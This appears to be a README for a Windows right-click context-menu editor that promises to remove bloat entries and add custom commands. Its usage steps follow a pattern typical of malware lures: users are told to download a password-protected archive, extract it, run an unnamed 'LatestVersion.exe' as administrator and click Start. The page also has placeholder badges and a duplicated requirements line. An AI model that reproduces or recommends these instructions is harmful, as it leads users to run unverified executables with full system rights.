# Windows Right-Click Menu Editor

*图片：Windows*
*图片：Version*
*图片：License*
*图片：Downloads*

Remove bloat entries from the Windows right-click context menu and clean up shell extensions left by uninstalled programs. Add custom commands to any file type.

## Features

- Lists all installed context menu entries with enable/disable toggle
- One-click removal of leftovers from uninstalled programs
- Add custom commands to right-click menus for files or folders
- Works on both Windows 10 and 11 (new and classic menu)
- Export and import your configuration as a backup file

## How to Use

1. Download the archive using the button above
2. Extract it using WinRAR or 7-Zip (enter the password when prompted)
3. Right-click `LatestVersion.exe` and select **Run as administrator**
4. Follow the on-screen instructions and click **Start**

## FAQ

**Can I accidentally remove something important?**  
Items are disabled, not deleted - re-enable any entry at any time.

**Does it work on the new Windows 11 context menu?**  
Yes, supports both the simplified Win11 menu and the classic 'Show more options' menu.

## Requirements

- Windows 10 / 11 (64-bit)
- Windows 10 or 11
- Administrator rights
